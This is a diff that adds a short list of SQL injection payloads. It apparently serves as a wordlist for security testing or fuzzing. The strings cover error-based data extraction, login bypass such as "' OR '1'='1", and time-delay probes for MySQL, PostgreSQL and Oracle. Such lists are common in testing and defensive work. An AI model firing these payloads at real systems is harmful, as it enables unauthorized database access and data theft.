@@ -1,0 +1,9 @@
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST(version() AS INTEGER)--
+' OR '1'='1
+admin' --
+' OR 1=1 LIMIT 1 --
+' OR ELT(1=1,SLEEP(5))--
+'; SELECT pg_sleep(5)--
+' AND dbms_pipe.receive_message(('a'),5)=0--
